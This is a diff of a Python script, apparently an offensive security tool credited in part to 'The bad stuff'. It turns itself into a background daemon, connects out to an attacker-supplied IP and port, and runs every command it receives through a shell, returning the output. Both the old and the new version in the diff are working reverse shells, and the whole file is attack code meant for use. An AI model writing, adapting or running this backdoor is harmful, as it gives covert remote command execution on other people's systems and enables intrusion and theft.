@@ -12,40 +12,41 @@
 #    Ryan Hays (The good stuff)                                            #
 #    Cole Lucas (The bad stuff)                                            #
 #**************************************************************************#
-
 import os
 import sys
 import socket
+import threading
+import time
+import select
+import struct
+import traceback
+import random
 import subprocess
 
 UMASK = 0
 WORKDIR = "/"
 MAXFD = 1024
-
 REDIRECT_TO = os.devnull if hasattr(os, "devnull") else "/dev/null"
 
 def createdaemon():
     try:
         pid = os.fork()
         if pid > 0:
-            os._exit(0)
+            os._exit(0)  # Exit parent process
     except OSError as e:
-        raise Exception(f"Fork #1 failed: {e.errno} ({e.strerror})")
+        raise RuntimeError(f"Fork #1 failed: {e}")
 
     os.setsid()
+    os.umask(UMASK)
 
     try:
         pid = os.fork()
         if pid > 0:
-            os._exit(0)
+            os._exit(0)  # Exit first child process
     except OSError as e:
-        raise Exception(f"Fork #2 failed: {e.errno} ({e.strerror})")
-
-    os.chdir(WORKDIR)
-    os.umask(UMASK)
+        raise RuntimeError(f"Fork #2 failed: {e}")
 
     maxfd = os.sysconf("SC_OPEN_MAX") if hasattr(os, "sysconf") else MAXFD
-
     for fd in range(0, maxfd):
         try:
             os.close(fd)
@@ -58,43 +59,43 @@ def createdaemon():
 
     return 0
 
-def reverse_shell(ip, port):
-    try:
-        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        so.connect((ip, port))
-    except socket.error as e:
-        sys.exit(f"Connection error: {e}")
-
+def handle_connection(sock):
     try:
         while True:
-            command = so.recv(1024).decode("utf-8")
-            if len(command.strip()) == 0:
-                continue
-
-            if command.lower() == "exit":
+            data = sock.recv(1024)
+            if not data:
                 break
 
             try:
-                result = subprocess.run(
-                    command, shell=True, capture_output=True, text=True
-                )
-                output = result.stdout + result.stderr
+                proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                sock.sendall(stdout + stderr)
             except Exception as e:
-                output = f"Error executing command: {str(e)}\n"
-
-            so.send(output.encode("utf-8"))
+                sock.sendall(str(e).encode())
     except Exception as e:
-        so.send(f"Session error: {str(e)}\n".encode("utf-8"))
+        print(f"Connection error: {e}")
     finally:
-        so.close()
+        sock.close()
 
 if __name__ == "__main__":
-    ret_code = createdaemon()
+    try:
+        shell_type = sys.argv[1]
+        ip_address = sys.argv[2]
+        port = int(sys.argv[3])
+    except IndexError:
+        print("Usage: python3 script.py <shell_type> <ip_address> <port>")
+        sys.exit(1)
 
-    if len(sys.argv) < 3:
-        sys.exit("Usage: python3 reverse_shell.py <ip> <port>")
+    if shell_type.lower() == 'std':
+        ret_code = createdaemon()
 
-    target_ip = sys.argv[1]
-    target_port = int(sys.argv[2])
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((ip_address, port))
+                handle_connection(s)
+        except Exception as e:
+            print(f"Error: {e}")
 
-    reverse_shell(target_ip, target_port)
+    else:
+        print("Unsupported shell type")
+        sys.exit(1)
